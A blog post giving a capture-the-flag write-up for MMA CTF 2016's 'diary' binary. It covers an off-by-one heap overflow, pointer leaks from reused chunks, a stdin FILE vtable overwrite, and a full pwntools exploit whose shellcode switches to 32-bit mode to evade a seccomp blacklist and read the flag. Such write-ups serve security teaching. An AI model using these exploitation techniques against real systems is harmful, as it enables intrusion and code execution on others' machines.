---
layout: post
title: MMA CTF 2016 - diary
published: True
---


> [aiRcraft](../binaries/aiRcraft)

> [libc.so.6](../binaries/libc.so.6)

{% highlight bash %}
diary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3648e29153ac0259a0b7c3e25537a5334f50107f, not stripped
{% endhighlight %}

{% highlight bash%}
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
{% endhighlight %}

## Summary
The program mmap's a custom heap that is given `rwxp` permissions.

{% highlight text%}
Start              End                Perm      Name
0x00400000         0x00402000         r-xp      /home/vagrant/CTFs/mmactf16/diary/diary
0x00601000         0x00602000         r--p      /home/vagrant/CTFs/mmactf16/diary/diary
0x00602000         0x00603000         rw-p      /home/vagrant/CTFs/mmactf16/diary/diary
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fe8000 0x00007ffff7feb000 rw-p      mapped
0x00007ffff7ff5000 0x00007ffff7ff6000 rwxp      mapped  <--- mmap'd heap!
0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p      mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
{% endhighlight %}

Chunks are allocated on this heap with a custom memory allocator. 

There are 3 main vulnerabilities in this program.

1. the `getnline()` function has an **off-by-one** vulnerability which allows an extra byte to be written to a note chunk, corrupting the `size` field of a subsequent note chunk
1. heap chunks that are re-allocated are not zero'd out before the re-allocation, leaving artifacts from old heap chunks, including heap chunk pointers, in the new heap chunk that can be leaked
1. there is a **write-what-where** vulnerability 

We can use the 2nd vulnerability to bypass ASLR and leak the mmaped heap address. 

{% highlight text %}
unlink_freelist+1B                   mov     rax, [rbp+free_chunk]
unlink_freelist+1F                   mov     rax, [rax+10h]
unlink_freelist+23                   mov     rdx, [rbp+free_chunk]
unlink_freelist+27                   mov     rdx, [rdx+8]
unlink_freelist+2B                   mov     [rax+8], rdx
unlink_freelist+2F                   mov     rax, [rbp+free_chunk]
unlink_freelist+33                   mov     rax, [rax+8]
unlink_freelist+37                   mov     rdx, [rbp+free_chunk]
unlink_freelist+3B                   mov     rdx, [rdx+10h]
unlink_freelist+3F                   mov     [rax+10h], rdx
{% endhighlight %}

{% highlight text %}
gdb-peda$ p _IO_2_1_stdin_
$3 = {
  file = {  
    _flags = 0xfbad208b,
    _IO_read_ptr = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_end = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_read_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_ptr = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_write_end = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n",
    _IO_buf_end = 0x7ffff7dd1964 <_IO_2_1_stdin_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "\n",
    _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}
{% endhighlight %}

{% highlight  text %}
gdb-peda$ x/32xg 0x7ffff7ff5118
0x7ffff7ff5118: 0x0000000000000029      0x00007ffff7ff5128 <-- fake vtable!
0x7ffff7ff5128: 0x00007ffff7dd19b0      0x4747474747474747 <-- &_IO_2_1_stdin_.vtable-0x8!
0x7ffff7ff5138: 0x4747474747474747      0x0000000000000028
0x7ffff7ff5148: 0x00000707000007d7      0x00007ffff7ff5170
0x7ffff7ff5158: 0x00000000006020c0      0x00007ffff7ff50f8
0x7ffff7ff5168: 0x0000000000000109      0x9090909090909090
0x7ffff7ff5178: 0x9090909090909090      0x9090909090909090
0x7ffff7ff5188: 0x9090909090909090      0x9090909090909090
0x7ffff7ff5198: 0x9090909090909090      0x9090909090909090
0x7ffff7ff51a8: 0x9090909090909090      0x9090909090909090
0x7ffff7ff51b8: 0x9090909090909090      0x9090909090909090
0x7ffff7ff51c8: 0x9090909090909090      0xc08308c083c03148
0x7ffff7ff51d8: 0x00602000c7c74802      0x4800001000c6c748
0x7ffff7ff51e8: 0x050f00000007c2c7      0xc748ff3148c03148
0x7ffff7ff51f8: 0xc2c74800602200c6      0xc748050f00000200
0x7ffff7ff5208: 0x04c74800602400c4      0x2444c70060220024
gdb-peda$ p &_IO_2_1_stdin_.vtable
$4 = (const struct _IO_jump_t **) 0x7ffff7dd19b8 <_IO_2_1_stdin_+216>
{% endhighlight %}

{% highlight text %}
gdb-peda$ p 0x7ffff7ff5170-0x7ffff7ff5128
$39 = 0x48
{% endhighlight %}


The vulnerability in this program is that it allows a 1-byte overflow to happen

Putting everything together, we can get the flag using the following exploit.

## Exploit
{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def register(date, size, note):
    r.sendlineafter(">>", "1")
    r.sendlineafter(" ... ", date)
    r.sendlineafter("size...", str(size))
    if size != 0:
        r.sendafter(date, note)

def delete(date):
    r.sendlineafter(">>", "3")
    r.sendlineafter(" ... ",date)

def show(date):
    r.sendlineafter(">>", "2")
    r.sendlineafter(" ... ",date)
    return r.recvuntil("1.")

def a64(payload):
    return asm(payload, arch='amd64', os='linux')

def exploit(r):
    # LEAK HEAP
    register("2001/01/01", 0x20, "A\n")
    register("2002/02/02", 0x20, "B\n")
    register("2003/03/03", 0x20, "C\n")

    delete("2001/01/01")
    delete("2002/02/02")

    register("2004/04/04", 0x64, "E")

    leak = show("2004/04/04")
    heap_base = u64(leak.split("04\n")[1][0:6].ljust(8,'\0'))-0x45
    log.success("mmaped heap base at: "+hex(heap_base))

    # LEAK LIBC
    payload  = p64(0x6020f8) #stdin@bss
    payload += p64(heap_base+0x8)
    register("2005/05/05",0x20, payload+"F"*0x10+"\n")
    delete("2005/05/05")

    leak = show("2004/04/04")
    stdin = u64(leak.split("04\n")[1][0:6].ljust(8,'\0'))
    libc_base = stdin-0x3c48e0
    stdout = libc_base+0x3c5620
    
    log.success("libc base at: "+hex(libc_base))
    log.success("_IO_2_1_stdout_ at: "+hex(stdout))

    # CORRUPT _IO_2_1_STDOUT_->vtable
    payload = p64(heap_base+0x128) #   
    payload += p64(stdin+0xd8-0x8) # offset to vtable
    register("2006/06/06",0x20, payload+"G"*0x10+"\n")
    
    # 32-BIT SHELLCODE
    # syscall  - rax=0x0, rdi=0x0, rsi=addr, rdx=0x20
    #payload_main = asm(shellcraft.i386.linux.execve('./bash'), arch='x86') <-- fails because need a 32-bit bash binary!
    payload_main = asm(shellcraft.i386.linux.open('./flag'), arch='x86')
    payload_main += asm(shellcraft.i386.linux.read(3, 0x602600, 100), arch='x86')
    payload_main += asm(shellcraft.i386.linux.write(1, 0x602600, 100), arch='x86')

    # 64-BIT SHELLCODE 
    # mprotect - rax=0xa, rdi=dest, rsi=len, rdx=0x7(rwx)
    # read     - rax=0x0, rdi=0(stdin), rsi=dest, rdx=count     
    sc_loader =  ''' 
                 xor rax, rax
                 add eax, 0x8
                 add eax, 0x2
                 mov rdi, 0x602000
                 mov rsi, 0x1000
                 mov rdx, 0x7
                 syscall
    
                 xor rax, rax
                 xor rdi, rdi
                 mov rsi, 0x602200
                 mov rdx, 0x200
                 syscall
                
                 mov rsp, 0x602400
                 mov qword ptr[rsp], 0x602200
                 mov dword ptr[rsp+4], 0x23
                 retf
                 '''            
    payload_loader = "\x90"*0x60 # why need this??
    payload_loader += asm(sc_loader, arch='amd64', os='linux')
    
    register("2007/07/07", 0x100, payload_loader + "\x90"*(0x100-len(payload_loader))) 
    delete("2006/06/06") 
    r.sendline(payload_main)
    r.recvuntil(">>")
    print r.recv(50) # get flag :)
    
    #r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/mmactf16/diary/diary'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
{%endhighlight %}
{% highlight text %}
➜  diary python solve.py
[*] For remote: solve.py HOST PORT
[+] Starting local process '/home/vagrant/CTFs/mmactf16/diary/diary': pid 27479
[27479]
[*] Paused (press any to continue)
[+] mmaped heap base at: 0x7ffff7ff5000
[+] libc base at: 0x7ffff7a0d000
[+] _IO_2_1_stdout_ at: 0x7ffff7dd2620
[*] Process '/home/vagrant/CTFs/mmactf16/diary/diary' stopped with exit code -11 (SIGSEGV) (pid 27479)
 TWCTF{bl4ckl157_53cc0mp_54ndb0x_15_d4ng3r0u5}
\x00\x00\x00
{% endhighlight %}
